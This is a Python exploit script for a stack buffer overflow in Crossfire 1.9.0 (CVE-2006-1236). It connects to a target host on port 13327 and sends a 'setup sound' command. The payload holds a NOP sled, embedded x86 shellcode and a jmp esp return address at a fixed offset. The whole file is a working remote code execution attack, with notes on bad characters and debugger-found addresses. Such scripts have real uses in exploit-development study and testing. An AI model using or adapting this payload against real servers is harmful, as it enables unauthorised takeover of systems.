#Crossfire 1.9.0
#CVE: 2006-1236
#https://www.exploit-db.com/exploits/1582
import socket,struct,sys
if(len(sys.argv)!=2):
	print(sys.argv[0]+" host")
	exit(0)
s=socket.socket()
s.connect((sys.argv[1],13327))
offset=4368
shellcode =  b"" #Change it
shellcode += b"\xdd\xc7\xba\xba\xd1\x12\xe6\xd9\x74\x24\xf4"
shellcode += b"\x5e\x33\xc9\xb1\x1f\x31\x56\x1a\x03\x56\x1a"
shellcode += b"\x83\xee\xfc\xe2\x4f\xbb\x18\xb8\x9e\xe7\xea"
shellcode += b"\xa7\xb3\x54\x46\x42\x31\xeb\x0e\x1b\xd4\xc6"
shellcode += b"\x4f\x8c\x4d\xb1\x8f\x1b\x70\x4f\x78\x5e\x72"
shellcode += b"\x5e\x24\xd7\x93\x0a\xb2\xbf\x03\x9a\x6d\xc9"
shellcode += b"\x42\x5f\x5f\x49\x01\xa0\x26\x53\x47\x55\xe4"
shellcode += b"\x0b\xf5\x95\x16\xcc\xa1\xff\x16\xa6\x54\x89"
shellcode += b"\xf4\x07\x9f\x44\x7a\xe2\xdf\x2e\xc6\x06\xf8"
shellcode += b"\x62\x3f\x60\x06\x93\x40\x92\x8f\x70\x81\x79"
shellcode += b"\x83\xb7\xe1\x72\x2b\x4a\x2b\x0a\xce\x75\xcb"
shellcode += b"\x1b\x8b\xfc\xcd\x85\x99\x95\xbd\xb5\x10\xe9"
shellcode += b"\x3b\x79\xd2\xe8\xbc\x9b\x9a\xec\x42\x5c\xda"
shellcode += b"\x55\x43\x5c\xda\xa9\x89\xdc"
#badchars: \x00\x20
padding=b"\x90"*(1000)+shellcode+b"\x90"*(offset-1000-len(shellcode))
eip=struct.pack("I",0x0807b8f8)#0x0807b8f8 : jmp esp
#0xbfffdf08 ---> addr of 'padding' in stack. I found it in a debugger
nops=b"\x90"*(4379-len(padding+eip))
shellcode=b""
s.send(b"\x11(setup sound "+padding+eip+nops+b"\x90\x00#")
print(s.recv(1024))
s.close()
print(len(padding+eip+nops))
